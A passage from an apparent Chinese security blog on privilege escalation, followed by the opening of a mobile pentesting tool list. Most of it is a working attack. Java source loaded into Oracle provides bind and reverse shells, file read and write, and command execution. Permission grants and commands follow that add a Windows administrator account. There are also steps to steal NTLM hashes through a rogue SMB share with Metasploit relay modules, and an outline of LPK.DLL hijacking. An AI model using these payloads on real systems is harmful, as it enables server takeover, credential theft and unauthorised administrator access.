+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt;</span><br><span class="line">SQL&gt; create or replace and compile java source named paeq as</span><br><span class="line"><span class="number">2</span> import java.io.*;</span><br><span class="line"><span class="number">3</span> import java.net.*;</span><br><span class="line"><span class="number">4</span> <span class="keyword">public</span> <span class="keyword">class</span> PAEQ&#123;</span><br><span class="line"><span class="number">5</span> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">listFolder</span><span class="params">(String path)</span></span>&#123;</span><br><span class="line"><span class="number">6</span> File f=null;</span><br><span class="line"><span class="number">7</span> String str=””;</span><br><span class="line"><span class="number">8</span> f=<span class="keyword">new</span> File(path);</span><br><span class="line"><span class="number">9</span> String[] files=f.<span class="built_in">list</span>();</span><br><span class="line"><span class="number">10</span> <span class="keyword">if</span>(files!=null)</span><br><span class="line"><span class="number">11</span> <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;files.length;i++)&#123;</span><br><span class="line"><span class="number">12</span> str+=files[i]+”/r/n”;</span><br><span class="line"><span class="number">13</span> &#125;</span><br><span class="line"><span class="number">14</span> <span class="keyword">return</span> str;</span><br><span class="line"><span class="number">15</span> &#125;</span><br><span class="line"><span class="number">16</span> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">saveFile</span><span class="params">(String filepath,String value)</span></span>&#123;</span><br><span class="line"><span class="number">17</span> FileOutputStream fos=null;</span><br><span class="line"><span class="number">18</span> <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="number">19</span> fos=<span class="keyword">new</span> FileOutputStream(filepath);</span><br><span class="line"><span class="number">20</span> fos.write(value.getBytes());</span><br><span class="line"><span class="number">21</span> <span class="keyword">return</span> “OK”;</span><br><span class="line"><span class="number">22</span> &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="number">23</span> <span class="keyword">return</span> e.getMessage();</span><br><span class="line"><span class="number">24</span> &#125; finally&#123;</span><br><span class="line"><span class="number">25</span> <span class="keyword">if</span>(fos!=null)&#123;</span><br><span class="line"><span class="number">26</span> <span class="keyword">try</span> &#123;fos.close();&#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;</span><br><span class="line"><span class="number">27</span> &#125;</span><br><span class="line"><span class="number">28</span> &#125;</span><br><span class="line"><span class="number">29</span> &#125;</span><br><span class="line"><span class="number">30</span> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readFile</span><span class="params">(String pathfile,String code)</span></span>&#123;</span><br><span class="line"><span class="number">31</span> BufferedReader br=null;</span><br><span class="line"><span class="number">32</span> String value=””;</span><br><span class="line"><span class="number">33</span> <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="number">34</span> br=<span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(<span class="keyword">new</span> FileInputStream(pathfile</span><br><span class="line">),code));</span><br><span class="line"><span class="number">35</span> String s=null;</span><br><span class="line"><span class="number">36</span> <span class="keyword">while</span>((s=br.readLine())!=null)&#123;</span><br><span class="line"><span class="number">37</span> value+=s;</span><br><span class="line"><span class="number">38</span> &#125;</span><br><span class="line"><span class="number">39</span> <span class="keyword">return</span> value;</span><br><span class="line"><span class="number">40</span> &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="number">41</span> <span class="keyword">return</span> e.getMessage();</span><br><span class="line"><span class="number">42</span> &#125; finally&#123;</span><br><span class="line"><span class="number">43</span> <span class="keyword">if</span>(br!=null)&#123;<span class="keyword">try</span> &#123;br.close();&#125; <span class="keyword">catch</span> (IOException e) &#123;&#125;&#125;</span><br><span class="line"><span class="number">44</span> &#125;</span><br><span class="line"><span class="number">45</span> &#125;</span><br><span class="line"><span class="number">46</span> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">execFile</span><span class="params">(String filepath,String code)</span></span>&#123;</span><br><span class="line"><span class="number">47</span> <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="number">48</span> Runtime rt=Runtime.getRuntime();</span><br><span class="line"><span class="number">49</span> String output=””;</span><br><span class="line"><span class="number">50</span> InputStreamReader isr = null;</span><br><span class="line"><span class="number">51</span> <span class="keyword">char</span>[] bufferC=<span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">1024</span>];</span><br><span class="line"><span class="number">52</span> <span class="keyword">try</span>&#123;</span><br><span class="line"><span class="number">53</span> Process ps=rt.exec(filepath);</span><br><span class="line"><span class="number">54</span> isr=<span class="keyword">new</span> InputStreamReader(ps.getInputStream(),code);</span><br><span class="line"><span class="number">55</span> <span class="keyword">while</span>((i=isr.read(bufferC,<span class="number">0</span>,bufferC.length))!=-<span class="number">1</span>)&#123;</span><br><span class="line"><span class="number">56</span> output+=<span class="keyword">new</span> String(bufferC,<span class="number">0</span>,i);</span><br><span class="line"><span class="number">57</span> &#125;</span><br><span class="line"><span class="number">58</span> <span class="keyword">return</span> output;</span><br><span class="line"><span class="number">59</span> &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line"><span class="number">60</span> <span class="keyword">return</span> e.getMessage();</span><br><span class="line"><span class="number">61</span> &#125;finally&#123;</span><br><span class="line"><span class="number">62</span> <span class="keyword">if</span>(isr!=null)<span class="keyword">try</span> &#123;isr.close();&#125; <span class="keyword">catch</span> (IOException e) &#123;&#125;</span><br><span class="line"><span class="number">63</span> &#125;</span><br><span class="line"><span class="number">64</span> &#125;</span><br><span class="line"><span class="number">65</span> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">bindShell</span><span class="params">(<span class="keyword">int</span> port)</span></span>&#123;</span><br><span class="line"><span class="number">66</span> ServerSocket ss=null;</span><br><span class="line"><span class="number">67</span> Socket s=null;</span><br><span class="line"><span class="number">68</span> <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="number">69</span> ss = <span class="keyword">new</span> ServerSocket(port);</span><br><span class="line"><span class="number">70</span> s=ss.accept();</span><br><span class="line"><span class="number">71</span> <span class="keyword">new</span> optShell(ss,s).start();</span><br><span class="line"><span class="number">72</span></span><br><span class="line"><span class="number">73</span> <span class="keyword">return</span> “OK”;</span><br><span class="line"><span class="number">74</span> &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="number">75</span> <span class="keyword">return</span> e.getMessage();</span><br><span class="line"><span class="number">76</span> &#125;</span><br><span class="line"><span class="number">77</span> &#125;</span><br><span class="line"><span class="number">78</span> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">reverseShell</span><span class="params">(String host,<span class="keyword">int</span> port)</span></span>&#123;</span><br><span class="line"><span class="number">79</span> Socket s=null;</span><br><span class="line"><span class="number">80</span> <span class="keyword">try</span>&#123;</span><br><span class="line"><span class="number">81</span> s=<span class="keyword">new</span> Socket(host,port);</span><br><span class="line"><span class="number">82</span> <span class="keyword">new</span> optShell(null,s).start();</span><br><span class="line"><span class="number">83</span> <span class="keyword">return</span> “OK”;</span><br><span class="line"><span class="number">84</span> &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line"><span class="number">85</span> <span class="keyword">return</span> e.getMessage();</span><br><span class="line"><span class="number">86</span> &#125;</span><br><span class="line"><span class="number">87</span> &#125;</span><br><span class="line"><span class="number">88</span> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> optShell extends Thread&#123;</span><br><span class="line"><span class="number">89</span> OutputStream os=null;</span><br><span class="line"><span class="number">90</span> InputStream is=null;</span><br><span class="line"><span class="number">91</span> ServerSocket ss;</span><br><span class="line"><span class="number">92</span> Socket s;</span><br><span class="line"><span class="number">93</span> <span class="function"><span class="keyword">public</span> <span class="title">optShell</span><span class="params">(ServerSocket ss,Socket s)</span></span>&#123;</span><br><span class="line"><span class="number">94</span> <span class="keyword">this</span>.ss=ss;</span><br><span class="line"><span class="number">95</span> <span class="keyword">this</span>.s=s;</span><br><span class="line"><span class="number">96</span> <span class="keyword">try</span>&#123;</span><br><span class="line"><span class="number">97</span> <span class="keyword">this</span>.is=s.getInputStream();</span><br><span class="line"><span class="number">98</span> <span class="keyword">this</span>.os=s.getOutputStream();</span><br><span class="line"><span class="number">99</span> &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line"><span class="number">100</span> <span class="keyword">if</span>(os!=null)<span class="keyword">try</span> &#123;os.close();&#125; <span class="keyword">catch</span>(Exception ex) &#123;&#125;</span><br><span class="line"><span class="number">101</span> <span class="keyword">if</span>(is!=null)<span class="keyword">try</span> &#123;is.close();&#125; <span class="keyword">catch</span>(Exception ex) &#123;&#125;</span><br><span class="line"><span class="number">102</span> <span class="keyword">if</span>(s!=null)<span class="keyword">try</span> &#123;s.close();&#125; <span class="keyword">catch</span>(Exception ex) &#123;&#125;</span><br><span class="line"><span class="number">103</span> <span class="keyword">if</span>(ss!=null)<span class="keyword">try</span> &#123;ss.close();&#125; <span class="keyword">catch</span>(Exception ex) &#123;&#125;</span><br><span class="line"><span class="number">104</span> &#125;</span><br><span class="line"><span class="number">105</span> &#125;</span><br><span class="line"><span class="number">106</span> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="number">107</span> BufferedReader br=<span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is));</span><br><span class="line"><span class="number">108</span> String line=””;</span><br><span class="line"><span class="number">109</span> String cmdhelp=”Command:/r/nlist /r/nsave/r/nread/r/nexec/r/nexit/r/n”;</span><br><span class="line"><span class="number">110</span> <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="number">111</span> <span class="comment">//os.write(cmdhelp.getBytes());</span></span><br><span class="line"><span class="number">112</span> line=br.readLine();</span><br><span class="line"><span class="number">113</span> <span class="keyword">while</span>(!”<span class="built_in">exit</span>”.equals(line))&#123;</span><br><span class="line"><span class="number">114</span> <span class="keyword">if</span>(line.length()&gt;<span class="number">3</span>)&#123;</span><br><span class="line"><span class="number">115</span> StringBuffer sb=<span class="keyword">new</span> StringBuffer(line.trim());</span><br><span class="line"><span class="number">116</span> String cmd=sb.substring(<span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line"><span class="number">117</span> <span class="keyword">if</span>(cmd.equals(“<span class="built_in">list</span>”))&#123;</span><br><span class="line"><span class="number">118</span> os.write(“input you path:/r/n”.getBytes());</span><br><span class="line"><span class="number">119</span> line=br.readLine();</span><br><span class="line"><span class="number">120</span> os.write(listFolder(line).getBytes());</span><br><span class="line"><span class="number">121</span> &#125;<span class="keyword">else</span> <span class="keyword">if</span>(“save”.equals(cmd))&#123;</span><br><span class="line"><span class="number">122</span> os.write(“input you filepath:/r/n”.getBytes());</span><br><span class="line"><span class="number">123</span> line=br.readLine();</span><br><span class="line"><span class="number">124</span> os.write(“input you value:/r/n”.getBytes());</span><br><span class="line"><span class="number">125</span> os.write(saveFile(line,br.readLine()).getBytes());</span><br><span class="line"><span class="number">126</span> &#125;<span class="keyword">else</span> <span class="keyword">if</span>(“read”.equals(cmd))&#123;</span><br><span class="line"><span class="number">127</span> os.write(“input you filepath:/r/n”.getBytes());</span><br><span class="line"><span class="number">128</span> line=br.readLine();</span><br><span class="line"><span class="number">129</span> os.write(“input you code examle:GBK/r/n”.getBytes());</span><br><span class="line"><span class="number">130</span> os.write(readFile(line,br.readLine()).getBytes());</span><br><span class="line"><span class="number">131</span> &#125;<span class="keyword">else</span> <span class="keyword">if</span>(“exec”.equals(cmd))&#123;</span><br><span class="line"><span class="number">132</span> os.write(“input you run filepath:/r/n”.getBytes());</span><br><span class="line"><span class="number">133</span> line=br.readLine();</span><br><span class="line"><span class="number">134</span> os.write(“input you code examle:GBK/r/n”.getBytes());</span><br><span class="line"><span class="number">135</span> os.write(execFile(line,br.readLine()).getBytes());</span><br><span class="line"><span class="number">136</span> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="number">137</span> os.write(cmdhelp.getBytes());</span><br><span class="line"><span class="number">138</span> &#125;</span><br><span class="line"><span class="number">139</span> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="number">140</span> os.write(cmdhelp.getBytes());</span><br><span class="line"><span class="number">141</span> &#125;</span><br><span class="line"><span class="number">142</span> line=br.readLine();</span><br><span class="line"><span class="number">143</span> &#125;</span><br><span class="line"><span class="number">144</span> &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="number">145</span> e.printStackTrace();</span><br><span class="line"><span class="number">146</span> &#125;finally&#123;</span><br><span class="line"><span class="number">147</span> <span class="keyword">if</span>(os!=null)<span class="keyword">try</span> &#123;os.close();&#125; <span class="keyword">catch</span>(Exception e) &#123;&#125;</span><br><span class="line"><span class="number">148</span> <span class="keyword">if</span>(is!=null)<span class="keyword">try</span> &#123;is.close();&#125; <span class="keyword">catch</span>(Exception e) &#123;&#125;</span><br><span class="line"><span class="number">149</span> <span class="keyword">if</span>(s!=null)<span class="keyword">try</span> &#123;s.close();&#125; <span class="keyword">catch</span>(Exception e) &#123;&#125;</span><br><span class="line"><span class="number">150</span> <span class="keyword">if</span>(ss!=null)<span class="keyword">try</span> &#123;ss.close();&#125; <span class="keyword">catch</span>(Exception e) &#123;&#125;</span><br><span class="line"><span class="number">151</span> &#125;</span><br><span class="line"><span class="number">152</span> &#125;</span><br><span class="line"><span class="number">153</span> &#125;</span><br><span class="line"><span class="number">154</span> &#125;</span><br><span class="line"><span class="number">155</span> /</span><br></pre></td></tr></table></figure>
+<p>Java 已创建。</p>
+<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; create <span class="keyword">or</span> replace <span class="function"><span class="keyword">function</span> <span class="title">PAEQ_LISTFOLDER</span><span class="params">(str varchar2)</span> <span class="title">return</span> <span class="title">varchar2</span></span><br><span class="line">2 <span class="title">as</span> <span class="title">language</span> <span class="title">java</span> <span class="title">name</span> ‘<span class="title">PAEQ</span>.<span class="title">listFolder</span><span class="params">(java.lang.<span class="keyword">String</span>)</span> <span class="title">return</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">S</span></span><br><span class="line"><span class="title">tring</span>’;</span></span><br><span class="line"><span class="number">3</span> /</span><br></pre></td></tr></table></figure>
+<p>函数已创建。</p>
+<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; create <span class="keyword">or</span> replace <span class="function"><span class="keyword">function</span> <span class="title">PAEQ_SAVEFILE</span><span class="params">(p varchar2,v varchar2)</span> <span class="title">return</span> <span class="title">varc</span></span><br><span class="line"><span class="title">har2</span></span><br><span class="line">2 <span class="title">as</span> <span class="title">language</span> <span class="title">java</span> <span class="title">name</span> ‘<span class="title">PAEQ</span>.<span class="title">saveFile</span><span class="params">(java.lang.<span class="keyword">String</span>,java.lang.<span class="keyword">String</span>)</span> <span class="title">ret</span></span><br><span class="line"><span class="title">urn</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">String</span>’;</span></span><br><span class="line"><span class="number">3</span> /</span><br></pre></td></tr></table></figure>
+<p>函数已创建。</p>
+<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; create <span class="keyword">or</span> replace <span class="function"><span class="keyword">function</span> <span class="title">PAEQ_READFILE</span><span class="params">(p varchar2,c varchar2)</span> <span class="title">return</span> <span class="title">varc</span></span><br><span class="line"><span class="title">har2</span></span><br><span class="line">2 <span class="title">as</span> <span class="title">language</span> <span class="title">java</span> <span class="title">name</span> ‘<span class="title">PAEQ</span>.<span class="title">readFile</span><span class="params">(java.lang.<span class="keyword">String</span>,java.lang.<span class="keyword">String</span>)</span> <span class="title">ret</span></span><br><span class="line"><span class="title">urn</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">String</span>’;</span></span><br><span class="line"><span class="number">3</span> /</span><br></pre></td></tr></table></figure>
+<p>函数已创建。</p>
+<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; create <span class="keyword">or</span> replace <span class="function"><span class="keyword">function</span> <span class="title">PAEQ_EXECFILE</span><span class="params">(fp varchar2,c varchar2)</span> <span class="title">return</span> <span class="title">var</span></span><br><span class="line"><span class="title">char2</span></span><br><span class="line">2 <span class="title">as</span> <span class="title">language</span> <span class="title">java</span> <span class="title">name</span> ‘<span class="title">PAEQ</span>.<span class="title">execFile</span><span class="params">(java.lang.<span class="keyword">String</span>,java.lang.<span class="keyword">String</span>)</span> <span class="title">ret</span></span><br><span class="line"><span class="title">urn</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">String</span>’;</span></span><br><span class="line"><span class="number">3</span> /</span><br></pre></td></tr></table></figure>
+<p>函数已创建。</p>
+<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; create or replace <span class="function"><span class="keyword">function</span></span> PAEQ_BINDSHELL(port <span class="keyword">number</span>) <span class="keyword">return</span> varchar2</span><br><span class="line"><span class="number">2</span> as language java <span class="keyword">name</span> ‘PAEQ.bindShell(<span class="built_in">int</span>) <span class="keyword">return</span> java.lang.String’;/</span><br><span class="line"><span class="number">3</span> /</span><br></pre></td></tr></table></figure>
+<p>警告: 创建的函数带有编译错误。什么意思？多了一个 / ？</p>
+<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; create or replace <span class="function"><span class="keyword">function</span></span> PAEQ_BINDSHELL(port <span class="keyword">number</span>) <span class="keyword">return</span> varchar2</span><br><span class="line"><span class="number">2</span> as language java <span class="keyword">name</span> ‘PAEQ.bindShell(<span class="built_in">int</span>) <span class="keyword">return</span> java.lang.String’;</span><br><span class="line"><span class="number">3</span> /</span><br></pre></td></tr></table></figure>
+<p>函数已创建。</p>
+<p>2.赋予权限</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; begin</span><br><span class="line"><span class="number">2</span> Dbms_Java.Grant_Permission(‘YSREAL’,’java.io.FilePermission’,’c:/WINDOWS/sy</span><br><span class="line">stem32/cmd.exe’,’read,write,execute,<span class="keyword">delete</span>’);</span><br><span class="line"><span class="number">3</span> Dbms_Java.Grant_Permission(‘YSREAL’,’java.lang.RuntimePermission’,’*’,’writ</span><br><span class="line">eFileDescriptor’);</span><br><span class="line"><span class="number">4</span> Dbms_Java.grant_permission(‘YSREAL’,’java.net.SocketPermission’,’*:*’,’acce</span><br><span class="line">pt,connect,listen,resolve’);</span><br><span class="line"><span class="number">5</span> end;</span><br><span class="line"><span class="number">6</span> /</span><br></pre></td></tr></table></figure>
+<p>PL/SQL 过程已成功完成。</p>
+<p>3.添加用户到管理员组</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="constant">SQL</span>&gt; select <span class="constant">PAEQ_EXECFILE</span>(‘<span class="constant">C</span><span class="symbol">:/WINDOWS/system32/cmd</span>.exe /c net user ceshi ceshi /</span><br><span class="line">add’,’<span class="constant">GBK</span>’) from dual;</span><br><span class="line"></span><br><span class="line"><span class="constant">PAEQ_EXECFILE</span>(‘<span class="constant">C</span><span class="symbol">:/WINDOWS/SYSTEM32/CMD</span>.<span class="constant">EXE</span>/<span class="constant">CNETUSERCESHICESHI</span>/<span class="constant">ADD</span>’,’<span class="constant">GBK</span>’)</span><br></pre></td></tr></table></figure>
+<p>——————————————————————————–</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="constant">SQL</span>&gt; select <span class="constant">PAEQ_EXECFILE</span>(‘<span class="constant">C</span><span class="symbol">:/WINDOWS/system32/cmd</span>.exe /c net localgroup <span class="constant">Adminis</span></span><br><span class="line">trators ceshi /add’,’<span class="constant">GBK</span>’) from dual;</span><br><span class="line"></span><br><span class="line"><span class="constant">PAEQ_EXECFILE</span>(‘<span class="constant">C</span><span class="symbol">:/WINDOWS/SYSTEM32/CMD</span>.<span class="constant">EXE</span>/<span class="constant">CNETLOCALGROUPADMINISTRATORSCESHI</span>/<span class="constant">ADD</span></span><br></pre></td></tr></table></figure>
+<p>——————————————————————————–</p>
+<p>提权完成。</p>
+<p>方法 2：<br>原理：<br>从数据库控制台初始化到远程 SMB 共享的连接，这样可以通过我们伪造的SMB服务器获得授权用户的 NTLM 的挑战回应值串。</p>
+<p>方法：<br>1.创建一个特殊的表：<br>SQL&gt; CREATE TABLE files (id NUMBER PRIMARY KEY, path VARCHAR(255) UNIQUE,<br>ot_format VARCHAR(6));<br>2.把我们的 SMB 共享的网络路径插到表中的路径字段中去；<br>SQL&gt; INSERT INTO files VALUES (1, ‘\172.16.0.235\SHARE’, NULL);<br>3.然后创建一个 ctxsys.context 指针到 ot_format 字段中去：<br>SQL&gt; CREATE INDEX file_index ON files(path) INDEXTYPE IS ctxsys.context<br>PARAMETERS (’datastore ctxsys.file_datastore format column ot_format’);<br>4.在创建这个指针的时候，如果高权限 RDBMS 进程正在运行，RDBMS 进程会初始化到我们的 SMB 共享服务器的连接，并且尝试用可信用户授权；<br>5.所以我们在 172.16.0.235 上刚刚开始运行伪造 SMB 服务器的时候，我们会得到密码的 HALFLM 挑战哈希值，所以我们可以用彩虹表或是暴露破解解密即可得到管理员密码。<br>6.破解不了，就用 SMB_relay，转发强化过程到服务器并且以管理员授权，<br>7.运行 metasploit 的 smb_relay 模块，设置本地 IP、port.etc。<br>8.配置 ora_ntlm_stealer 模块，IP与 smb_relay 一样，运行来产生 SQL 攻击代码，默认代码路径：./data/exploits/msf.sql。<br>9.用普通账户链接数据库，然后执行用 ora_ntlm_stealer 产生的 SQL 语句；<br>10.然后在 smb_relay 模块看到就会有其他用户来链接我们的伪造服务器，在特权 RDBMS 进程在运行的时候，用户的连接被初始化，</p>
+<h4 id="LPK__u52AB_u6301_u63D0_u6743_uFF1A"><a href="#LPK__u52AB_u6301_u63D0_u6743_uFF1A" class="headerlink" title="LPK 劫持提权："></a>LPK 劫持提权：</h4><p>原理：<br>在程序运行时，操作系统加载程序首先从应用程序目录中加载模块，这样就有机会让应用程序去加载我们的 DLL。如果这个 DLL 和系统目录下的某个 DLL 同名，导出表也相同， 功能就是加载系统目录下的那个 DLL，并且将导出表转发到那个系统目录下的 DLL。这时 DLL 劫持就发生了。可以看出，构造一个符合上面要求的 DLL， 再将其放在可执行文件的目录即可轻松实现 DLL 劫持了。</p>
+<p>方法：<br>通过编程来实现一个 LPK.DLL 文件，它与系统目录下的 LPK.DLL 导出表相同，并能加载系统目录下的 LPK.DLL，并且能将导出表转发到真实的 LPK.DLL。 可以看出我们要实现的这个 DLL 需求如下：<br>1、构造一个与系统目录下 LPK.DLL 一样的导出表；<br>2、加载系统目录下的 LPK.DLL；<br>3、将导出函数转发到系统目录下的 LPK.DLL 上；<br>4、在初始化函数中加入我们要执行的代码。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/04/18/tiquan/" data-id="cin5p3mjd0004f8fwm9s9itxg" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-移动应用渗透测试备忘单(二)" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/03/20/移动应用渗透测试备忘单(二)/" class="article-date">
+  <time datetime="2016-03-20T06:45:05.000Z" itemprop="datePublished">2016-03-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/03/20/移动应用渗透测试备忘单(二)/">移动应用渗透测试备忘单(二)</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>##移动应用渗透测试备忘单(二)</p>
+<p>###iOS应用程序渗透测试</p>
+<p>####访问文件系统</p>
+<ul>
+<li><a href="https://filezilla-project.org/download.php?show_all=1" target="_blank" rel="external">FileZilla</a> - 它支持FTP、SFTP和FTP(FTP / SSL / TLS)。</li>
+<li><a href="https://cyberduck.io/" target="_blank" rel="external">Cyberduck</a> - FTP、SFTP WebDAV,S3,Azure &amp; openstack SWIFT 浏览器mac和windows下。</li>
+<li><a href="https://code.google.com/p/iphonetunnel-usbmuxconnectbyport/downloads/list" target="_blank" rel="external">itunnel</a> - 使用SSH通过usb接口。</li>
+<li><a href="http://www.i-funbox.com/" target="_blank" rel="external">iFunbox</a> - 文件和应用程序管理工具为iphone,ipad和iPod Touch。</li>
+</ul>
+<h4 id="u9006_u5411_u5DE5_u7A0B_u548C_u9759_u6001_u5206_u6790"><a href="#u9006_u5411_u5DE5_u7A0B_u548C_u9759_u6001_u5206_u6790" class="headerlink" title="逆向工程和静态分析"></a>逆向工程和静态分析</h4><ul>
+<li><a href="http://www.unix.com/man-page/osx/1/otool/" target="_blank" rel="external">otool</a> - otool命令显示指定的目标文件或库的一部分。</li>
+<li><a href="http://cydia.radare.org/" target="_blank" rel="external">Clutch</a> - 解密bundleID成二进制或指定的应用程序和转储.ipa文件</li>
